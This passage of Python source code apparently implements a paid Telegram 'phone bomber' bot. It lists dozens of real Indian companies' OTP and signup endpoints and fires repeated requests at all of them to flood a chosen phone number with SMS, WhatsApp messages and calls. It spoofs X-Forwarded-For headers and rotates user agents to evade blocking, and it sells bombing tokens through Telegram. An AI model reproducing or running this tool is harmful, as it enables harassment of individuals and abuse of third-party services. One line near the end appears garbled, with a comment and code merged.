        {"name": "PayMe India SMS", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
        {"name": "Shopper's Stop SMS", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
        {"name": "Hyuga SMS", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "BigCash SMS", "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
        {"name": "Lifestyle SMS", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
        {"name": "WorkIndia SMS", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
        {"name": "PokerBaazi SMS", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
        {"name": "My11Circle SMS", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "HomeTriangle SMS", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Wellness Forever SMS", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"},
        {"name": "HealthMug SMS", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Vyapar SMS", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
        {"name": "Kredily SMS", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Tata Motors SMS", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
        {"name": "Moglix SMS", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
        {"name": "MyGov SMS", "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male", "method": "GET", "headers": {}, "data": None},
        {"name": "TrulyMadly SMS", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
        {"name": "CodFirm SMS", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
        {"name": "Swipe SMS", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
        {"name": "More Retail SMS", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
        {"name": "Country Delight SMS", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
        {"name": "AstroSage SMS", "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
        {"name": "TooToo SMS", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
        {"name": "ConfirmTkt SMS", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
        {"name": "BetterHalf SMS", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
        {"name": "Nuvama SMS", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
        {"name": "Mpokket SMS", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "DailyHunt SMS", "url": "https://dailyhunt.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "ShareChat SMS", "url": "https://sharechat.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Moj SMS", "url": "https://moj.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "MX Player SMS", "url": "https://mxplayer.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Zee5 SMS", "url": "https://zee5.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "SonyLIV SMS", "url": "https://sonyliv.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "Hotstar SMS", "url": "https://hotstar.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Voot SMS", "url": "https://voot.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
        {"name": "JioCinema SMS", "url": "https://jiocinema.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
        {"name": "Airtel Xstream SMS", "url": "https://airtelxstream.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    ]
    
    # Combine all
    apis = call_apis + whatsapp_apis + sms_apis
    
    # Remove duplicates
    seen = set()
    unique_apis = []
    for api in apis:
        key = api["name"]
        if key not in seen:
            seen.add(key)
            unique_apis.append(api)
    
    return unique_apis

# Generate 1000+ APIs
ULTIMATE_APIS = generate_apis()
print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")

# ============ PHONE DESTROYER ============
class PhoneDestroyer:
    def __init__(self):
        self.running = False
        self.current_phone = None
        self.stats = {
            "calls": 0,
            "whatsapp": 0,
            "sms": 0,
            "hits": 0,
            "total": 0,
            "start_time": 0
        }
    
    async def bomb_worker(self, session, api, phone):
        """Single API bomber"""
        while self.running:
            try:
                name = api["name"].lower()
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                headers["User-Agent"] = random.choice([
                    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36"
                ])
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                if "call" in name or "voice" in name:
                    self.stats["calls"] += 1
                elif "whatsapp" in name:
                    self.stats["whatsapp"] += 1
                else:
                    self.stats["sms"] += 1
                
                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=5, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            self.stats["hits"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=5, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            self.stats["hits"] += 1
                
                self.stats["total"] += 1
                await asyncio.sleep(0.05)
                
            except:
                await asyncio.sleep(0.1)
                continue
    
    async def start_bombing(self, phone):
        """Start bombing"""
        self.running = True
        self.current_phone = phone
        self.stats["start_time"] = time.time()
        
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, verify_ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                task = asyncio.create_task(self.bomb_worker(session, api, phone))
                tasks.append(task)
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
    
    def stop(self):
        """Stop bombing"""
        self.running = False

destroyer = PhoneDestroyer()

# ============ TELEGRAM BOT HANDLERS ============
app_bot = None

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    user_data = db.get_user(user.id)
    
    keyboard = [
        [InlineKeyboardButton("💀 START BOMB", callback_data='bomb')],
        [InlineKeyboardButton("🛑 STOP BOMB", callback_data='stop')],
        [InlineKeyboardButton("📊 STATUS", callback_data='status')],
        [InlineKeyboardButton("🪙 TOKENS", callback_data='tokens')],
        [InlineKeyboardButton("💰 BUY TOKENS", url="https://t.me/LuaFucker")],
        [InlineKeyboardButton("👑 ADMIN", callback_data='admin')] if user.id == OWNER_ID else []
    ]
    
    await update.message.reply_text(
        f"💀 **SEPAXYT ULTIMATE BOMBER**\n\n"
        f"👤 **User:** {user.first_name}\n"
        f"🪙 **Tokens:** {user_data[2] if user_data else 100}\n"
        f"📞 **Used:** {user_data[3] if user_data else 0}\n"
        f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
        f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n\n"
        f"📞 **Send any 10-digit number to bomb!**\n"
        f"👑 **Owner:** @SepaxYt",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if text.isdigit() and len(text) == 10:
        user_data = db.get_user(user_id)
        if not user_data or user_data[2] < 1:
            await update.message.reply_text(
                "❌ **Insufficient tokens!**\n\n"
                f"🪙 Your tokens: {user_data[2] if user_data else 0}\n"
                f"💳 Buy tokens from: @LuaFucker",
                parse_mode='Markdown'
            )
            return
        
        db.update_tokens(user_id, -1)
        
        await update.message.reply_text(
            f"💀 **BOMBING STARTED!**\n\n"
            f"📞 **Target:** +91{text}\n"
            f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
            f"🔄 **Running in background...**\n\n"
            f"🛑 Use /stop to stop bombing",
            parse_mode='Markdown'
        )
        
        def run_bomb():
            try:
                asyncio.run(destroyer.start_bombing(text))
            except:
                pass
        
        thread = threading.Thread(target=run_bomb)
        thread.daemon = True
        thread.start()
        
    else:
        await update.message.reply_text(
            "📞 **Invalid input!**\n\nSend 10-digit Indian number.\nExample: `9876543210`",
            parse_mode='Markdown'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == 'bomb':
        await query.edit_message_text("📞 **Send 10-digit number:**")
    
    elif query.data == 'stop':
        destroyer.stop()
        await query.edit_message_text(
            f"🛑 **BOMBING STOPPED!**\n\n"
            f"📊 Final stats:\n"
            f"💥 Hits: {destroyer.stats['hits']}\n"
            f"🎯 Total: {destroyer.stats['total']}",
            parse_mode='Markdown'
        )
    
    elif query.data == 'status':
        elapsed = time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
        await query.edit_message_text(
            f"📊 **BOMBER STATUS**\n\n"
            f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n"
            f"📞 **Target:** +91{destroyer.current_phone if destroyer.current_phone else 'None'}\n"
            f"📞 **Calls:** {destroyer.stats['calls']}\n"
            f"📱 **WhatsApp:** {destroyer.stats['whatsapp']}\n"
            f"💬 **SMS:** {destroyer.stats['sms']}\n"
            f"💥 **Hits:** {destroyer.stats['hits']}\n"
            f"🎯 **Total:** {destroyer.stats['total']}\n"
            f"⏰ **Uptime:** {int(elapsed//60)}m {int(elapsed%60)}s\n"
            f"⚡ **APIs:** {len(ULTIMATE_APIS)}",
            parse_mode='Markdown'
        )
    
    elif query.data == 'tokens':
        user_data = db.get_user(user_id)
        await query.edit_message_text(
            f"🪙 **TOKEN BALANCE**\n\n"
            f"👤 **User:** {query.from_user.first_name}\n"
            f"🪙 **Tokens:** {user_data[2] if user_data else 0}\n"
            f"📞 **Used:** {user_data[3] if user_data else 0}\n\n"
            f"💳 **Buy tokens:** @LuaFucker",
            parse_mode='Markdown'
        )
    
    elif query.data == 'admin' and user_id == OWNER_ID:
        await query.edit_message_text(
            f"👑 **ADMIN PANEL**\n\n"
            f"📊 **Total Users:** {db.cursor.execute('SELECT COUNT(*) FROM users').fetchone()[0]}\n"
            f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
            f"💥 **Total Hits:** {destroyer.stats['hits']}\n\n"
            f"📝 **Commands:**\n"
            f"/create [tokens] - Create redeem code\n"
            f"/addtokens [user_id] [amount] - Add tokens\n"
            f"/users - Show users list\n"
            f"/channels - Show channels\n"
            f"/addchannel @channel - Add channel",
            parse_mode='Markdown'
        )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    destroyer.stop()
    await update.message.reply_text("🛑 **Bombing stopped!**")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    elapsed = time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
    await update.message.reply_text(
        f"📊 **BOMBER STATUS**\n\n"
        f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n"
        f"📞 **Target:** +91{destroyer.current_phone if destroyer.current_phone else 'None'}\n"
        f"📞 **Calls:** {destroyer.stats['calls']}\n"
        f"📱 **WhatsApp:** {destroyer.stats['whatsapp']}\n"
        f"💬 **SMS:** {destroyer.stats['sms']}\n"
        f"💥 **Hits:** {destroyer.stats['hits']}\n"
        f"🎯 **Total:** {destroyer.stats['total']}\n"
        f"⏰ **Uptime:** {int(elapsed//60)}m {int(elapsed%60)}s\n"
        f"⚡ **APIs:** {len(ULTIMATE_APIS)}",
        parse_mode='Markdown'
    )

async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = db.get_user(update.effective_user.id)
    await update.message.reply_text(
        f"🪙 **TOKEN BALANCE**\n\n"
        f"👤 **User:** {update.effective_user.first_name}\n"
        f"🪙 **Tokens:** {user_data[2] if user_data else 0}\n"
        f"📞 **Used:** {user_data[3] if user_data else 0}\n\n"
        f"💳 **Buy tokens:** @LuaFucker",
        parse_mode='Markdown'
    )

# Admin commands
async def create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        tokens = int(context.args[0])
        code = db.generate_redeem(tokens, OWNER_ID)
        await update.message.reply_text(
            f"✅ **Redeem Code Created!**\n\n"
            f"📝 `{code}`\n"
            f"🪙 **{tokens} tokens**\n"
            f"⏰ **Valid for 30 days**",
            parse_mode='Markdown'
        )
    except:
        await update.message.reply_text("❌ Use: /create [tokens]")

async def add_tokens_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
        db.update_tokens(user_id, amount)
        await update.message.reply_text(f"✅ Added {amount} tokens to user {user_id}")
    except:
        await update.message.reply_text("❌ Use: /addtokens [user_id] [amount]")

async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    users = db.cursor.execute('SELECT user_id, username, first_name, tokens FROM users LIMIT 20').fetchall()
    text = "👥 **USERS LIST**\n\n"
    for u in users:
        text += f"👤 {u[2]} (@{u[1]}) - 🪙 {u[3]}\n"
    await update.message.reply_text(text, parse_mode='Markdown')

async def channels_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    channels = db.get_channels()
    text = "📢 **CHANNELS**\n\n"
    for c in channels:
        text += f"📢 {c}\n"
    await update.message.reply_text(text, parse_mode='Markdown')

async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        channel = context.args[0]
        if not channel.startswith('@'):
            channel = '@' + channel
        db.add_channel(channel)
        await update.message.reply_text(f"✅ Channel {channel} added!")
    except:
        await update.message.reply_text("❌ Use: /addchannel @channel")

# ============ FLASK APP ============
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({
        "status": "running",
        "bot": "SepaxYt Ultimate Bomber",
        "apis": len(ULTIMATE_APIS),
        "running": destroyer.running,
        "hits": destroyer.stats["hits"],
        "uptime": time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
    })

@flask_app.route('/health')
def health():
    return "OK", 200

def run_flask():
    try:
        flask_app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
    except:
        pass

# ============ MAIN ============
def main():
    global app_bot
    
    print("=" * 60)
    print("💀 SEPAXYT ULTIMATE PHONE DESTROYER")
    print("=" * 60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"🌐 Port: {PORT}")
    print(f"⚡ APIs Loaded: {len(ULTIMATE_APIS)}")
    print("=" * 60)
    
    # Start Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("✅ Flask server started")
    
    # Create bot    try:
        app_bot = Application.builder().token(BOT_TOKEN).build()
        
        # Commands
        app_bot.add_handler(CommandHandler("start", start_command))
        app_bot.add_handler(CommandHandler("stop", stop_command))
        app_bot.add_handler(CommandHandler("status", status_command))
        app_bot.add_handler(CommandHandler("tokens", tokens_command))
        app_bot.add_handler(CommandHandler("create", create_code))
        app_bot.add_handler(CommandHandler("addtokens", add_tokens_admin))
        app_bot.add_handler(CommandHandler("users", users_list))
        app_bot.add_handler(CommandHandler("channels", channels_list))
        app_bot.add_handler(CommandHandler("addchannel", add_channel))
        app_bot.add_handler(CallbackQueryHandler(button_callback))
        app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("✅ Bot handlers registered")
        print("🚀 Bot is starting...")
        
        app_bot.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"❌ Bot error: {e}")

if __name__ == "__main__":
    main()